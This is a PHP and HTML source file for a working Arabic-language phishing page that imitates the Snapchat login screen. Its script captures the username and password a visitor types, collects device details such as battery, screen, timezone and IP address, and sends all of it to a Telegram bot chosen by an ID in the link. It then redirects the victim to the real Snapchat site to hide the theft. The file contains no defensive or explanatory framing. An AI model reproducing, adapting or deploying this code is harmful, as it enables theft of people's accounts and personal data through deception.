<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
👻 <b>بيانات تسجيل دخول Snapchat</b>

📧 <b>اسم المستخدم أو البريد:</b> <code>{$credentials['username']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى Snapchat</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #FFFC00;
      color: #000000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }
    
    .container {
      width: 100%;
      max-width: 380px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 24px;
    }
    
    .snapchat-logo {
      width: 60px;
      height: 60px;
      margin-bottom: 12px;
    }
    
    .login-form {
      background-color: #FFFFFF;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 3px 15px rgba(0, 0, 0, 0.12);
      border: 1px solid #E0E0E0;
    }
    
    h1 {
      text-align: center;
      margin-bottom: 16px;
      font-size: 20px;
      font-weight: 700;
      color: #000000;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 13px;
      color: #666666;
      line-height: 1.4;
    }
    
    .input-group {
      margin-bottom: 15px;
    }
    
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 13px;
      color: #333333;
      font-weight: 600;
    }
    
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      background-color: #F7F7F7;
      border: 1.5px solid #E0E0E0;
      border-radius: 8px;
      color: #333333;
      font-size: 14px;
      transition: border-color 0.2s;
    }
    
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #FFFC00;
      background-color: #FFFFFF;
    }
    
    .login-btn {
      width: 100%;
      padding: 12px;
      background-color: #FFFC00;
      color: #000000;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 8px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #FFF200;
    }
    
    .links {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
    }
    
    .links a {
      color: #0066CC;
      text-decoration: none;
      display: block;
      margin: 8px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #0052A3;
      text-decoration: underline;
    }
    
    .divider {
      border-top: 1px solid #E0E0E0;
      margin: 16px 0;
      position: relative;
    }
    
    .divider-text {
      position: absolute;
      top: -8px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #FFFFFF;
      padding: 0 8px;
      color: #666666;
      font-size: 11px;
    }
    
    .signup-btn {
      width: 100%;
      padding: 12px;
      background-color: #FFFFFF;
      color: #0066CC;
      border: 1.5px solid #0066CC;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 8px;
      transition: background-color 0.2s;
    }
    
    .signup-btn:hover {
      background-color: #F0F8FF;
    }
    
    .footer {
      text-align: center;
      margin-top: 24px;
      color: #666666;
      font-size: 11px;
      line-height: 1.5;
    }
    
    .footer a {
      color: #666666;
      text-decoration: none;
      margin: 0 4px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 24px;
        height: 24px;
        border: 2px solid rgba(255, 252, 0, 0.2);
        border-radius: 50%;
        border-top-color: #FFFC00;
        animation: spin 1s linear infinite;
        margin: 16px auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 8px;
        font-size: 13px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #666666;
    }
    
    .error-message {
      color: #FF4D4D;
      font-size: 13px;
      margin-top: 8px;
      text-align: center;
      display: none;
    }

    .security-notice {
      background-color: #F7F7F7;
      border-radius: 8px;
      padding: 10px;
      margin-top: 16px;
      font-size: 11px;
      color: #666666;
      text-align: center;
      border-left: 3px solid #FFFC00;
    }

    .language-selector {
      text-align: center;
      margin-top: 16px;
      font-size: 11px;
      color: #666666;
    }
    
    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 12px;
    }
    
    .checkbox-group input[type="checkbox"] {
      margin-left: 8px;
      width: 16px;
      height: 16px;
      accent-color: #FFFC00;
    }
    
    .checkbox-group label {
      margin-bottom: 0;
      font-weight: normal;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار Snapchat الشبح -->
      <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_015359_Google.jpg" class="snapchat-logo" alt="Snapchat Logo">
    </div>
    
    <div class="login-form">
      <h1>تسجيل الدخول إلى Snapchat</h1>
      <p class="subtitle">ادخل اسم المستخدم وكلمة المرور للدخول إلى حسابك</p>
      
      <form id="snapchatLoginForm">
        <div class="input-group">
          <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
          <input type="text" id="username" name="username" autocomplete="username" required autofocus>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="rememberMe" name="rememberMe">
          <label for="rememberMe">تذكرني على هذا الجهاز</label>
        </div>
        
        <button type="submit" class="login-btn">تسجيل الدخول</button>
        
        <div class="links">
          <a href="#">هل نسيت كلمة المرور؟</a>
          <a href="#">تواجه مشكلة في تسجيل الدخول؟</a>
        </div>
      </form>
      
      <div class="divider">
        <span class="divider-text">أو</span>
      </div>
      
      <p class="subtitle">ليس لديك حساب؟</p>
      <button type="button" class="signup-btn">إنشاء حساب</button>
      
      <div class="loader" id="loader"></div>
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">حدث خطأ أثناء عملية التسجيل. يرجى المحاولة مرة أخرى.</div>
      
      <div class="security-notice">
        <p>لحماية حسابك، نستخدم أحدث تقنيات الأمان للتأكد من أنك المالك الحقيقي للحساب.</p>
      </div>
    </div>
    
    <div class="language-selector">
      <a href="#">English</a> | 
      <a href="#">Español</a> | 
      <a href="#">Français</a> | 
      <a href="#">Italiano</a> | 
      <a href="#">Português</a>
    </div>
    
    <div class="footer">
      <a href="#">الخصوصية</a>
      <a href="#">الشروط</a>
      <a href="#">الإعدادات</a>
      <a href="#">المساعدة</a>
      <p>© 2025 Snap Inc. جميع الحقوق محفوظة.</p>
      <p>Snapchat وشعار الشبح مسجلين كعلامات تجارية لشركة Snap Inc.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('snapchatLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {username, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى Snapchat بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://www.snapchat.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
